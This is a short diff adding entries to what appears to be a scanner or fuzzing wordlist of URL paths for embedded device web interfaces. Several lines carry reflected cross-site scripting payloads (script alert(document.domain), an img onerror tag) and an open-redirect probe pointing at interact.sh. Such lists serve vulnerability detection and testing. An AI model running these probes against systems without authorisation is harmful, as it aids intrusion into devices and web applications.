@@ -304,3 +304,6 @@
 /goform/activate_process?isv=&akey=&hostid=&count=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /boafrm/formWlanRedirect?redirect-url=http://interact.sh&wlan_id=1
 /Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror=
+/rest/users/1
+/live_mfg.html
+/?page</script><script>alert(document.domain)</script>
